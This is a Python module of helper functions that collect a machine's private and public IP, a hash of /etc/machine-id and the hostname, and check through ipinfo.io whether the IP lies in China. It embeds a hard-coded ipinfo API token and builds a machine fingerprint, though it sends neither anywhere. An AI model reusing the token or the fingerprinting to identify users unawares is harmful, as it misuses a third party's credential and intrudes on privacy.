import socket
import hashlib
import requests as __requests
import ipaddress as __ipaddress

def _private_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    private_ip_string = s.getsockname()[0]
    s.close()
    return private_ip_string

def _public_ip():
    return __requests.get('https://devnull.cn/ip').json()['origin']

def _system_id():
    try:
        with open('/etc/machine-id', 'r') as f:
            rr_string = hashlib.md5(f.read().encode()).hexdigest()
    except:
        rr_string = hashlib.md5(socket.gethostname().encode()).hexdigest()
    return rr_string

def _hostname():
    return socket.gethostname()


def _is_private_ip(ipaddr=None):
    try:
        addr = __ipaddress.IPv4Address(ipaddr)
        if addr.is_private:
            return True
        else:
            return False
    except:
        return False

def _ip_regulated():
    try:
        _ipaddr = _public_ip()
        ipinfo_url = f"https://ipinfo.io/{_ipaddr}?token=589b1bf9286d42"
        ip_info = __requests.get(ipinfo_url, headers={'referer': "https://devnull.cn"}).json()
        # print(ip_info)
        country = ip_info["country"].lower()
        if country in ['cn','china'] or _is_private_ip(_ipaddr):
            return True
        else:
            return False
    except:
        return False